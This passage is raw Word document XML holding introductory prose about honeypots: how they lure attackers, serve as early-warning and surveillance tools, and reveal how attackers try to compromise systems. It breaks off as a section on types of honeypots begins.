        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>If</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oyed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>correc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can serve as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ear</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y-warn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>advanced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>urv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ill</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>cks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>IT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>works.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ana</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ckers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>, prov</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>uab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ght</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oopho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="19" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-18"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ypes of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oneypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="75" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed based on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on) and based on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">r </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
